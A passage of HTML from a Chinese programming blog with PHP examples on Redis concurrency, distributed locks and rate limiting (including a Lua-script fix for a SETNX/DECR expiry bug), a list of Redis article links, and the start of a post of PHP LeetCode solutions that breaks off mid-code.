class="line"><span class="comment">//https://www.cnblogs.com/iforever/p/5796902.html</span></span><br><span class="line">$client = <span class="keyword">new</span> Predis\Client([</span><br><span class="line">    <span class="string">'scheme'</span> =&gt; <span class="string">'tcp'</span>,</span><br><span class="line">    <span class="string">'host'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'port'</span> =&gt; <span class="number">6379</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">1000</span>; $i++) &#123;</span><br><span class="line">    $num = intval($client-&gt;get(<span class="string">"name"</span>));</span><br><span class="line">    $num = $num + <span class="number">1</span>;</span><br><span class="line">    $client-&gt;setex(<span class="string">"name"</span>, $num, <span class="number">10080</span>);</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line">è®¾ç½®nameåˆå§‹å€¼ä¸º<span class="number">0</span>ï¼Œç„¶ååŒæ—¶ç”¨ä¸¤ä¸ªç»ˆç«¯æ‰§è¡Œä¸Šé¢çš„ç¨‹åºï¼Œæœ€ånameçš„å€¼å¯èƒ½ä¸æ˜¯<span class="number">2000</span>ï¼Œè€Œæ˜¯ä¸€ä¸ª&lt;<span class="number">2000</span>çš„å€¼ï¼Œè¿™ä¹Ÿå°±è¯æ˜äº†æˆ‘ä»¬ä¸Šé¢çš„å¹¶å‘é—®é¢˜çš„å­˜åœ¨</span><br><span class="line">redisä¸­å‘½ä»¤æ˜¯æ»¡è¶³åŸå­æ€§çš„ï¼Œå› æ­¤åœ¨å€¼ä¸ºé˜¿æ‹‰ä¼¯æ•°å­—çš„æ—¶å€™ï¼Œæˆ‘å¯ä»¥å°†getå’Œsetå‘½ä»¤ä¿®æ”¹ä¸ºincræˆ–è€…incrby</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">1000</span>; $i++) &#123;</span><br><span class="line">    $client-&gt;incr(<span class="string">"name"</span>);</span><br><span class="line">    $client-&gt;expire(<span class="string">"name"</span>, <span class="number">10800</span>);</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line">éæ•°å­—é‚£åªèƒ½ç”¨watchã€multiã€execäº†</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ï¼‰setnx(lockkey, å½“å‰æ—¶é—´+è¿‡æœŸè¶…æ—¶æ—¶é—´) ï¼Œå¦‚æœè¿”å›<span class="number">1</span>ï¼Œåˆ™è·å–é”æˆåŠŸï¼›å¦‚æœè¿”å›<span class="number">0</span>åˆ™æ²¡æœ‰è·å–åˆ°é”ï¼Œè½¬å‘<span class="number">2</span>ã€‚</span><br><span class="line"><span class="number">2.</span>ï¼‰get(lockkey)è·å–å€¼oldExpireTime ï¼Œå¹¶å°†è¿™ä¸ªvalueå€¼ä¸å½“å‰çš„ç³»ç»Ÿæ—¶é—´è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå°äºå½“å‰ç³»ç»Ÿæ—¶é—´ï¼Œåˆ™è®¤ä¸ºè¿™ä¸ªé”å·²ç»è¶…æ—¶ï¼Œå¯ä»¥å…è®¸åˆ«çš„è¯·æ±‚é‡æ–°è·å–ï¼Œè½¬å‘<span class="number">3</span>ã€‚</span><br><span class="line"><span class="number">3.</span>ï¼‰è®¡ç®—newExpireTime=å½“å‰æ—¶é—´+è¿‡æœŸè¶…æ—¶æ—¶é—´ï¼Œç„¶ågetset(lockkey, newExpireTime) ä¼šè¿”å›å½“å‰lockkeyçš„å€¼currentExpireTimeã€‚</span><br><span class="line"><span class="number">4.</span>ï¼‰åˆ¤æ–­currentExpireTimeä¸oldExpireTime æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰ï¼Œè¯´æ˜å½“å‰getsetè®¾ç½®æˆåŠŸï¼Œè·å–åˆ°äº†é”ã€‚å¦‚æœä¸ç›¸ç­‰ï¼Œè¯´æ˜è¿™ä¸ªé”åˆè¢«åˆ«çš„è¯·æ±‚è·å–èµ°äº†ï¼Œé‚£ä¹ˆå½“å‰è¯·æ±‚å¯ä»¥ç›´æ¥è¿”å›å¤±è´¥ï¼Œæˆ–è€…ç»§ç»­é‡è¯•ã€‚</span><br><span class="line"><span class="number">5</span>ï¼‰ åœ¨è·å–åˆ°é”ä¹‹åï¼Œå½“å‰çº¿ç¨‹å¯ä»¥å¼€å§‹åšè‡ªå¢æ“ä½œï¼Œå½“å¤„ç†å®Œæ¯•åï¼Œæ¯”è¾ƒè‡ªå·±çš„å¤„ç†æ—¶é—´å’Œå¯¹äºé”è®¾ç½®çš„è¶…æ—¶æ—¶é—´ï¼Œå¦‚æœå°äºé”è®¾ç½®çš„è¶…æ—¶æ—¶é—´ï¼Œåˆ™ç›´æ¥æ‰§è¡Œ<span class="keyword">delete</span>é‡Šæ”¾é”ï¼›å¦‚æœå¤§äºé”è®¾ç½®çš„è¶…æ—¶æ—¶é—´ï¼Œåˆ™ä¸éœ€è¦å†é”è¿›è¡Œå¤„ç†</span><br></pre></td></tr></table></figure>
<h3 id="Redis-ä½¿ç”¨-Lua-è„šæœ¬æ›¿ä»£-SETNX-DECR-ä¿è¯åŸå­æ€§"><a href="#Redis-ä½¿ç”¨-Lua-è„šæœ¬æ›¿ä»£-SETNX-DECR-ä¿è¯åŸå­æ€§" class="headerlink" title="Redis ä½¿ç”¨ Lua è„šæœ¬æ›¿ä»£ SETNX / DECR ä¿è¯åŸå­æ€§"></a>Redis ä½¿ç”¨ Lua è„šæœ¬æ›¿ä»£ SETNX / DECR ä¿è¯åŸå­æ€§</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * TRUE: è§¦å‘é™æµï¼ŒFALSEï¼šæœªè§¦å‘é™æµ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">acquire</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $redisHandler = $<span class="keyword">this</span>-&gt;redisInstance-&gt;getHandler();</span><br><span class="line">            $redisHandler-&gt;set($<span class="keyword">this</span>-&gt;rateLimitKey, $<span class="keyword">this</span>-&gt;tokenNum, [<span class="string">'nx'</span>, <span class="string">'ex'</span> =&gt; $<span class="keyword">this</span>-&gt;expireTime]);</span><br><span class="line">            $leftTokenNum = $redisHandler-&gt;decr($<span class="keyword">this</span>-&gt;rateLimitKey);</span><br><span class="line">            <span class="keyword">if</span> ($leftTokenNum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ä½¿ç”¨ redis æ¥èµ·åˆ°ä¸€ä¸ªé™æµçš„ä½œç”¨ï¼Œ<span class="number">1</span> ç§’é’Ÿåªå…è®¸ <span class="number">1</span> äººè´­ä¹°</span><br><span class="line">  $redis-&gt;set(<span class="string">'key'</span>, <span class="string">'1'</span>, [<span class="string">'nx'</span>, <span class="string">'ex'</span>=&gt;<span class="number">1</span>]); å‘½ä»¤ï¼Œè®¾ç½®å€¼ä¸º <span class="number">1</span> è¿‡æœŸæ—¶é—´ä¸º <span class="number">1</span> ç§’çš„è®¡æ•°å™¨ï¼ŒåŸºäºè¯¥è®¡æ•°å™¨çš„æ‰£å‡æ¥è¾¾åˆ° <span class="number">1</span> ç§’é’Ÿæ”¾è¡Œ <span class="number">1</span> ä¸ªè¯·æ±‚çš„ç›®çš„ã€‚</span><br><span class="line">    </span><br><span class="line">    $key = <span class="string">'test_redis_key'</span>;</span><br><span class="line">    $redis-&gt;set($key, <span class="string">'1'</span>, [<span class="string">'nx'</span>, <span class="string">'ex'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">    $left = $redis-&gt;decr($key);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// è¿™é‡Œé€šè¿‡çŠ¶æ€ç æ¥æ›´æ–¹ä¾¿çš„è§‚å¯Ÿ</span></span><br><span class="line">      header(<span class="string">'Is-Limited:1'</span>, <span class="literal">true</span>, <span class="number">500</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">'Is-Limited:0'</span>, <span class="literal">true</span>, <span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    åœ¨ Redis key æœªè¿‡æœŸä¹‹å‰ï¼ŒDECR å‘½ä»¤éƒ½æ˜¯æ­£å¸¸æ‰£å‡çš„ã€‚ä¸€æ—¦ key è¿‡æœŸäº†ï¼Œå†æ‰§è¡Œ DECR å‘½ä»¤ï¼Œä¼šå‘ç° key çš„å€¼å’Œè¿‡æœŸæ—¶é—´éƒ½å˜ä¸º <span class="number">-1</span> äº†ã€‚</span><br><span class="line">å‡è®¾åœ¨ç¬¬ä¸€å¥ SETNX ä¹‹åç¬¬äºŒå¥ DECR ä¹‹å‰ï¼Œkey è¿‡æœŸäº†ï¼Œå†æ‰§è¡Œ DECR å°±ä¼šå…ˆç”Ÿæˆä¸€ä¸ªæ°¸ä¸è¿‡æœŸå€¼ä¸º <span class="number">0</span> çš„ keyã€‚</span><br><span class="line"></span><br><span class="line">ä¹‹åæ‰€æœ‰è¯·æ±‚çš„ SETNX éƒ½æ˜¯ fasleï¼Œä¸€ç›´ä¼šåŸºäºè¿™ä¸ªæ°¸ä¸è¿‡æœŸçš„ key è¿›è¡Œé€’å‡ï¼Œæ‰€æœ‰çš„ $leftTokenNum éƒ½å°äº <span class="number">0</span>ï¼Œå› æ­¤å¯¼è‡´æ‰€æœ‰è¯·æ±‚è¢«é™æµã€‚</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'test_redis_key'</span>;</span><br><span class="line">$redis-&gt;set($key, <span class="string">'3'</span>, [<span class="string">'nx'</span>, <span class="string">'px'</span> =&gt; <span class="number">5</span>]); <span class="comment">// key è®¾ç½®æˆ 5 æ¯«ç§’è¿‡æœŸ</span></span><br><span class="line">$left = $redis-&gt;decr($key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œé€šè¿‡çŠ¶æ€ç æ¥æ›´æ–¹ä¾¿çš„è§‚å¯Ÿ</span></span><br><span class="line">  header(<span class="string">'Is-Limited:1'</span>, <span class="literal">true</span>, <span class="number">500</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  header(<span class="string">'Is-Limited:0'</span>, <span class="literal">true</span>, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br><span class="line">&gt; <span class="built_in">eval</span> <span class="string">"return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;"</span> <span class="number">2</span> key1 key2 first second</span><br><span class="line"><span class="number">1</span>) <span class="string">"key1"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"key2"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"first"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"second"</span></span><br><span class="line"></span><br><span class="line"> $key = <span class="string">'test_redis_key1'</span>;</span><br><span class="line"></span><br><span class="line">        $script = &lt;&lt;&lt;LUA</span><br><span class="line">local max = tonumber(ARGV[1])</span><br><span class="line">local interval_milliseconds = tonumber(ARGV[2])</span><br><span class="line">local current = tonumber(redis.call('get', KEYS[1]) or 0)</span><br><span class="line"></span><br><span class="line">if (current + 1 &gt; max) then</span><br><span class="line">    return true</span><br><span class="line">else</span><br><span class="line">    redis.call('incrby', KEYS[1], 1)</span><br><span class="line">    if (current == 0) then</span><br><span class="line">        redis.call('pexpire', KEYS[1], interval_milliseconds)</span><br><span class="line">    end</span><br><span class="line">    return false</span><br><span class="line">end</span><br><span class="line">LUA;</span><br><span class="line"></span><br><span class="line">        $redis-&gt;script('load', $script);</span><br><span class="line">        $isLimited = $redis-&gt;eval($script, [$key, 1, 5], 1); // key 5 æ¯«ç§’è¿‡æœŸ</span><br><span class="line"></span><br><span class="line">        if ($isLimited) &#123;</span><br><span class="line">            header('Is-Limited:1', true, 500);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            header('Is-Limited:0', true, 200);</span><br><span class="line">        &#125;</span><br><span class="line">        Redis ä¸­ DECR ä¸€ä¸ªä¸å­˜åœ¨çš„ key ä¼šå…ˆæŠŠ key å€¼è®¾ç½®ä¸º 0 , TTL è®¾ç½®ä¸º -1 (æ°¸ä¸è¿‡æœŸ)ï¼Œå†è¿›è¡Œå‡ 1 æ“ä½œã€‚</span><br><span class="line">        ä½¿ç”¨ SETNX é…åˆ DECR å®ç°é™æµï¼Œä¼šå‡ºç° key æ°¸ä¸è¿‡æœŸæƒ…å†µã€‚è¿‡æœŸæ—¶é—´æ¯”è¾ƒå°æˆ–è€…é«˜å¹¶å‘æƒ…å†µä¸‹ï¼Œå‘ç”Ÿæ¦‚ç‡æ›´é«˜ã€‚</span><br><span class="line">        åœ¨ Redis ä¸­æ‰§è¡Œ Lua è„šæœ¬æ˜¯åŸå­æ“ä½œã€‚</span><br><span class="line">        å¯ä»¥é€šè¿‡ Redis + Lua å®ç°é«˜å¹¶å‘ä¸‹çš„é™æµã€‚https://learnku.com/articles/39265</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/uuk020/redis-reference-manual" target="_blank" rel="noopener">Redis ä½¿ç”¨æ‰‹å†Œ PHP ä»£ç å®ç°</a></p>
<p><a href="https://learnku.com/articles/25892" target="_blank" rel="noopener">Redis ä¸­ Keys ä¸ Scan çš„ä½¿ç”¨</a></p>
<p><a href="https://learnku.com/articles/38228" target="_blank" rel="noopener">Redis å‘½ä»¤å¤§å…¨</a></p>
<p><a href="https://juejin.im/post/5bcfd17ff265da0ae50550f2" target="_blank" rel="noopener">Redis å‘½ä»¤è¡Œå·¥å…·çš„å¦™ç”¨</a></p>
<p><a href="https://bettercuicui.github.io/2017/07/04/REDIS/redis%E8%BF%87%E6%9C%9F%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A0%E9%99%A4%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">redisè¿‡æœŸæ•°æ®å­˜å‚¨æ–¹å¼ä»¥åŠåˆ é™¤æ–¹å¼</a></p>
<p><a href="https://bettercuicui.github.io/2018/04/01/REDIS/redis%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/#" target="_blank" rel="noopener">redisè¶…æ—¶é—®é¢˜æ’æŸ¥</a></p>
<p><a href="https://juejin.im/entry/5ba4eed3f265da0afc2bfb44" target="_blank" rel="noopener">åˆ†å¸ƒå¼å’Œredis</a></p>
<p><a href="https://learnku.com/articles/36375" target="_blank" rel="noopener">Redis ä¸»ä»å¤åˆ¶è¯¦ç»†è§£è¯»</a></p>
<p><a href="http://blog.13sai.com/essay/188" target="_blank" rel="noopener">ä»ç¼“å­˜ç©¿é€èŠåˆ°å¸ƒéš†è¿‡æ»¤å™¨</a></p>
<p><a href="http://blog.13sai.com/essay/165" target="_blank" rel="noopener">åŸºäºredisçš„ç§’æ€</a></p>
<p><a href="http://blog.13sai.com/essay/178" target="_blank" rel="noopener">Redis ä¸ºä»€ä¹ˆä½¿ç”¨å•è¿›ç¨‹å•çº¿ç¨‹æ–¹å¼ä¹Ÿè¿™ä¹ˆå¿«</a></p>
<p><a href="https://learnku.com/articles/24466" target="_blank" rel="noopener">é¢è¯•æ—¶ä½ å¯èƒ½éœ€è¦çš„ Redis çŸ¥è¯†æŠ€å·§</a></p>
<p><a href="https://me.jinchuang.org/archives/430.html" target="_blank" rel="noopener">Redis ä¸€ç«™å¼ç®¡ç†å¹³å°å·¥å…·ngbdf/redis-manager</a></p>
<p><a href="https://www.cnblogs.com/qingyunzong/p/9004509.html" target="_blank" rel="noopener">Kafkaå­¦ä¹ ä¹‹è·¯</a></p>
<p><a href="https://learnku.com/articles/33110" target="_blank" rel="noopener">redisé™æµ</a></p>
<p><a href="https://learnku.com/articles/31068" target="_blank" rel="noopener">Redis &amp; å¸¸ç”¨ç”¨æ³•è¯¦æƒ…</a></p>
<p><a href="https://learnku.com/articles/30827" target="_blank" rel="noopener">Redis åº”ç”¨-åˆ†å¸ƒå¼é”</a></p>
<p><a href="https://github.com/mylxsw/redis-tui" target="_blank" rel="noopener">å‘½ä»¤è¡Œçš„ Redis</a></p>
<p><a href="https://www.cnblogs.com/glon/p/6541709.html" target="_blank" rel="noopener">Redis ç®€å•å…¥é—¨</a></p>
<p><a href="https://juejin.im/post/5cb13b4d6fb9a0687b7dd0bd" target="_blank" rel="noopener">50é“Redisé¢è¯•é¢˜å²ä¸Šæœ€å…¨</a></p>
<p><a href="https://shuwoom.com/?p=2563" target="_blank" rel="noopener">MYSQLæ€§èƒ½ä¼˜åŒ–å­¦ä¹ ç¬”è®°-(1)æ•°æ®åº“è®¾è®¡</a></p>
<p><a href="https://learnku.com/articles/30214" target="_blank" rel="noopener">Redis In Action ç¬”è®°</a></p>
<p><a href="https://segmentfault.com/a/1190000017882763" target="_blank" rel="noopener">redisç¼“å­˜é›ªå´©ã€ç¼“å­˜ç©¿é€ã€ç¼“å­˜æ›´æ–°äº†è§£å¤šå°‘ï¼Ÿgithub.com/ZhongFuCheng3y/3y</a></p>
<p><a href="https://learnku.com/articles/24802" target="_blank" rel="noopener">Redis åŸºç¡€å­¦ä¹ </a></p>
<p><a href="https://learnku.com/articles/31894" target="_blank" rel="noopener"> Redis bitmap åœ¨å¾®æ“å†…åšå…¬ä¼—å·çš„ç­¾åˆ°æ´»åŠ¨</a></p>
<p><a href="https://learnku.com/articles/29500" target="_blank" rel="noopener">Redis In Action ç¬”è®°</a></p>
<p><a href="https://juejin.im/post/5af5b2c36fb9a07ac65318bd" target="_blank" rel="noopener">ä½¿ç”¨ç¼“å­˜çš„æ­£ç¡®å§¿åŠ¿</a></p>
<p><a href="https://juejin.im/post/5b584831e51d45190d5556b2#heading-0" target="_blank" rel="noopener">Redisé—®é¢˜æ±‡æ€»</a></p>
<p><a href="https://learnku.com/articles/31351" target="_blank" rel="noopener">Redis çš„ç¬¬ n æ¬¡æ¶‰åŠ</a></p>
<p><a href="https://my.oschina.net/editorial-story/blog/3052308?p=3" target="_blank" rel="noopener">epoll çš„æœ¬è´¨æ˜¯ä»€ä¹ˆ</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/19/leetcode-é¢˜è§£/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/19/leetcode-é¢˜è§£/" itemprop="url">leetcode é¢˜è§£</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-03-19T15:15:39+08:00">
                2019-03-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  494 å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  2 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Two-Sum"><a href="#Two-Sum" class="headerlink" title="Two Sum"></a>Two Sum</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</span><br><span class="line">ç»™å®š nums = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>], target = <span class="number">9</span></span><br><span class="line">å› ä¸º nums[<span class="number">0</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span></span><br><span class="line">æ‰€ä»¥è¿”å› [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twoSum</span>(<span class="params">$nums, $target</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset($nums[<span class="number">1</span>])) <span class="keyword">return</span>;</span><br><span class="line">        foreach ($nums <span class="keyword">as</span> $key =&gt; $num) &#123;</span><br><span class="line">            unset($nums[$key]);</span><br><span class="line">            $result = array_search($target - $num, $nums);</span><br><span class="line">            <span class="keyword">if</span> ($result !== <span class="literal">false</span>) <span class="keyword">return</span> [$key, $result];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param String $J</span></span><br><span class="line"><span class="comment">     * @param String $S</span></span><br><span class="line"><span class="comment">     * @return Integer  https://learnku.com/articles/27545</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">numJewelsInStones</span>(<span class="params">$j, $s</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $jArr = str_split($j);</span><br><span class="line">        $sArr = str_split($s);</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        foreach($sArr <span class="keyword">as</span> $sItem)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array($sItem, $jArr))&#123;</span><br><span class="line">                $i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $i;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="åœ¨å¸¸æ•°æ—¶é—´å†…æ£€ç´¢åˆ°æœ€å°å…ƒç´ çš„æ ˆ"><a href="#åœ¨å¸¸æ•°æ—¶é—´å†…æ£€ç´¢åˆ°æœ€å°å…ƒç´ çš„æ ˆ" class="headerlink" title="åœ¨å¸¸æ•°æ—¶é—´å†…æ£€ç´¢åˆ°æœ€å°å…ƒç´ çš„æ ˆ"></a>åœ¨å¸¸æ•°æ—¶é—´å†…æ£€ç´¢åˆ°æœ€å°å…ƒç´ çš„æ ˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $stack;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * initialize your data structure here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;stack = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param Integer $x</span></span><br><span class="line"><span class="comment">     * @return NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;stack[] = $x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        array_pop($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">top</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> end($<span 